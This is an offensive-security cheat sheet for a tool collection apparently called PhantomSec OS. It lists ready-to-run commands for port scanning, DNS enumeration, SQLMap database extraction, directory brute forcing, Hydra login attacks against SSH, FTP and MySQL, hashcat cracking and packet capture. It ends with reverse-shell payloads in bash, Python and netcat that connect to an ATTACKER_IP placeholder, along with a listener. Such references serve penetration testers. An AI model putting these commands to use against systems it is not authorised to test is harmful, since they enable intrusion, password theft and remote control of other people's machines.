# PhantomSec OS — Tool Reference

## 🔍 Information Gathering

### Nmap
```bash
nmap -F <target>               # Quick scan (top 100 ports)
nmap -p- <target>              # All ports
nmap -sV -sC <target>          # Version + scripts
nmap -O <target>               # OS detection
nmap --script vuln <target>    # Vulnerability scripts
```

### Whois
```bash
whois example.com
whois 8.8.8.8
```

### DNS Enumeration
```bash
dig +short A example.com
dig +short MX example.com
dig +short NS example.com
dig ANY example.com
```

### GeoIP
```bash
curl -s http://ip-api.com/json/8.8.8.8 | python3 -m json.tool
```

---

## 💉 Web Exploitation

### SQLMap
```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D dbname --tables --batch
```

### Directory Brute Force (manual)
```bash
for d in admin login wp-admin phpmyadmin backup .git; do
  curl -s -o /dev/null -w "%{http_code} $d\n" http://target.com/$d
done
```

---

## 🔑 Password Attacks

### Hydra
```bash
hydra -l admin -P wordlist.txt ssh://192.168.1.1
hydra -l admin -P wordlist.txt ftp://192.168.1.1
hydra -L users.txt -P pass.txt mysql://192.168.1.1
```

### Hash Cracking (offline with hashcat — external)
```bash
hashcat -m 0  hash.txt wordlist.txt   # MD5
hashcat -m 100 hash.txt wordlist.txt  # SHA1
hashcat -m 1800 hash.txt wordlist.txt # sha512crypt
```

---

## 📡 Network Analysis

### Packet Capture
```bash
tcpdump -i wlan0 -c 100
tcpdump -i wlan0 port 80 -A
tcpdump -i wlan0 -w capture.pcap
```

### Port Scanning (Nmap)
```bash
nmap -sP 192.168.1.0/24          # Ping sweep
nmap -sn 192.168.1.0/24          # Host discovery
```

---

## 🔐 Cryptography

### OpenSSL
```bash
# Generate RSA key pair
openssl genrsa -out key.pem 2048
openssl rsa -in key.pem -pubout -out key.pub

# Encrypt/decrypt
openssl enc -aes-256-cbc -in file.txt -out file.enc
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

# Hash
echo -n "password" | openssl md5
echo -n "password" | openssl sha256
```

---

## 🐚 Reverse Shells

### Listener
```bash
nc -lvnp 4444
```

### Payloads
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# Netcat
nc -e /bin/bash ATTACKER_IP 4444
```
